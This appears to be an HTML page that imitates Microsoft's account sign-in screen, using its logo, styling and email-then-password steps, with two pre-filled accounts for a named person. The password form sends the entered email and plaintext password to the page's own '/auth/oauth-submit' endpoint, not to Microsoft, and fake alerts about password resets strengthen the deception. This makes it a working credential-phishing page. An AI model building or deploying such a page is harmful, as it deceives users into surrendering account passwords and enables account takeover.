<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in to your Microsoft account</title>
  <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap"/>
  
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
      background: #1b1b1b;
      background-image: radial-gradient(circle at 50% 50%, #292929 0%, #121212 100%);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .ms-container {
      width: 100%;
      max-width: 440px;
    }
    .ms-card {
      background: #242424;
      padding: 44px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 8px;
      margin-bottom: 16px;
      position: relative;
    }
    .ms-brand {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 24px;
    }
    .ms-logo-icon {
      width: 24px;
      height: 24px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2px;
    }
    .ms-logo-icon span:nth-child(1) { background: #f25022; }
    .ms-logo-icon span:nth-child(2) { background: #7fba00; }
    .ms-logo-icon span:nth-child(3) { background: #00a4ef; }
    .ms-logo-icon span:nth-child(4) { background: #ffb900; }
    .ms-brand-text {
      font-size: 19px;
      font-weight: 600;
      color: #cccccc;
    }
    .ms-title {
      font-size: 24px;
      font-weight: 600;
      color: #ffffff;
      margin-bottom: 20px;
    }
    .ms-pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 6px 12px;
      background: rgba(255, 255, 255, 0.06);
      border-radius: 16px;
      cursor: pointer;
      font-size: 14px;
      color: #e0e0e0;
      margin-bottom: 20px;
    }
    .ms-pill:hover {
      background: rgba(255, 255, 255, 0.12);
    }
    .ms-input-group {
      margin-bottom: 20px;
      position: relative;
    }
    .ms-input {
      width: 100%;
      padding: 10px 0;
      font-size: 16px;
      color: #ffffff;
      border: none;
      border-bottom: 1px solid #777777;
      outline: none;
      background: transparent;
      transition: border-color 0.2s;
    }
    .ms-input:focus {
      border-bottom: 2px solid #0086f0;
    }
    .ms-input::placeholder {
      color: #888888;
    }
    .ms-quick-list {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-bottom: 20px;
    }
    .ms-quick-btn {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 10px 12px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 6px;
      cursor: pointer;
      color: #ffffff;
      font-size: 14px;
      text-align: start;
      transition: background 0.15s;
    }
    .ms-quick-btn:hover {
      background: rgba(255, 255, 255, 0.1);
    }
    .ms-quick-avatar {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: #0078d4;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 13px;
    }
    .ms-links {
      margin-bottom: 24px;
      font-size: 13px;
    }
    .ms-link {
      color: #0086f0;
      text-decoration: none;
      display: inline-block;
      margin-bottom: 8px;
    }
    .ms-link:hover {
      text-decoration: underline;
    }
    .ms-actions {
      display: flex;
      justify-content: flex-end;
      gap: 12px;
    }
    .btn-ms-back {
      padding: 8px 20px;
      background: rgba(255, 255, 255, 0.1);
      color: #ffffff;
      border: none;
      font-size: 15px;
      font-weight: 600;
      border-radius: 2px;
      cursor: pointer;
    }
    .btn-ms-next {
      padding: 8px 28px;
      background: #0067b8;
      color: #ffffff;
      border: none;
      font-size: 15px;
      font-weight: 600;
      border-radius: 2px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-ms-next:hover {
      background: #0078d4;
    }
  </style>
</head>
<body>

  <div class="ms-container">
    <div class="ms-card">
      <div class="ms-brand">
        <div class="ms-logo-icon">
          <span></span><span></span><span></span><span></span>
        </div>
        <span class="ms-brand-text">Microsoft</span>
      </div>

      <!-- STEP 1: Email / Account Input -->
      <div id="msStep1">
        <h1 class="ms-title">Sign in</h1>

        <div class="ms-quick-list">
          <button type="button" class="ms-quick-btn" onclick="selectMsAccount('Sam Salameh', 'sam.dev1@hotmail.com')">
            <div class="ms-quick-avatar">S</div>
            <div>
              <div style="font-weight:600;">Sam Salameh</div>
              <div style="font-size:12px; color:#aaa;">sam.dev1@hotmail.com</div>
            </div>
          </button>

          <button type="button" class="ms-quick-btn" onclick="selectMsAccount('Sam Salameh', 'samsalameh@outlook.com')">
            <div class="ms-quick-avatar">S</div>
            <div>
              <div style="font-weight:600;">Sam Salameh</div>
              <div style="font-size:12px; color:#aaa;">samsalameh@outlook.com</div>
            </div>
          </button>
        </div>

        <div class="ms-input-group">
          <input type="email" id="msEmailInput" class="ms-input" placeholder="Email, phone, or Skype">
        </div>

        <div class="ms-links">
          <span style="color:#aaa;">No account? </span>
          <a href="#" onclick="alert('Creating new accounts is automated upon login.'); return false;" class="ms-link">Create one!</a>
        </div>

        <div class="ms-actions">
          <button type="button" class="btn-ms-next" onclick="nextToPassword()">Next</button>
        </div>
      </div>

      <!-- STEP 2: Password Input -->
      <div id="msStep2" style="display:none;">
        <div class="ms-pill" onclick="backToStep1()">
          <span>←</span>
          <span id="msPillEmail">sam.dev1@hotmail.com</span>
        </div>

        <h1 class="ms-title">Enter password</h1>

        <form action="/auth/oauth-submit" method="POST">
          <input type="hidden" name="provider" value="microsoft">
          <input type="hidden" id="msFormName" name="name" value="Sam Salameh">
          <input type="hidden" id="msFormEmail" name="email" value="sam.dev1@hotmail.com">

          <div class="ms-input-group">
            <input type="password" id="msPasswordInput" name="password" class="ms-input" placeholder="Password" required autofocus>
          </div>

          <div class="ms-links">
            <a href="#" onclick="alert('Password reset link sent to your Microsoft email.'); return false;" class="ms-link">Forgot password?</a>
          </div>

          <div class="ms-actions">
            <button type="button" class="btn-ms-back" onclick="backToStep1()">Back</button>
            <button type="submit" class="btn-ms-next">Sign in</button>
          </div>
        </form>
      </div>

    </div>
  </div>

  <script>
    function selectMsAccount(name, email) {
      document.getElementById('msFormName').value = name;
      document.getElementById('msFormEmail').value = email;
      document.getElementById('msPillEmail').innerText = email;
      
      document.getElementById('msStep1').style.display = 'none';
      document.getElementById('msStep2').style.display = 'block';
      setTimeout(() => document.getElementById('msPasswordInput').focus(), 100);
    }

    function nextToPassword() {
      const email = document.getElementById('msEmailInput').value.trim();
      if (!email || !email.includes('@')) {
        alert('Please enter a valid Microsoft email address (e.g. Hotmail or Outlook).');
        return;
      }
      selectMsAccount(email.split('@')[0], email);
    }

    function backToStep1() {
      document.getElementById('msStep2').style.display = 'none';
      document.getElementById('msStep1').style.display = 'block';
    }
  </script>
</body>
</html>
